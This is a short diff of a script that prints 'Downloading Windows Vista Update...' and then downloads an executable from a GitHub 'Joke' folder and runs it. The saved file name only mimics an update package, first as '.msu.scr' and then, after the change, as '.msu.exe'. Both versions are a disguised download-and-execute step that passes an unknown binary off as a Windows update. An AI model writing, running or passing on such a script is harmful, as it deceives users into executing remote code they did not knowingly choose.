@@ -1,3 +1,3 @@
 echo Downloading Windows Vista Update...
-irm -uri "https://github.com/someonefromdiscord/cvm/raw/refs/heads/master/Joke/Vista.exe" -outfile "Vista.msu.scr"
-Start-Process Vista.msu.scr
+irm -uri "https://github.com/someonefromdiscord/cvm/raw/refs/heads/master/Joke/Vista.exe" -outfile "Vista.msu.exe"
+Start-Process Vista.msu.exe
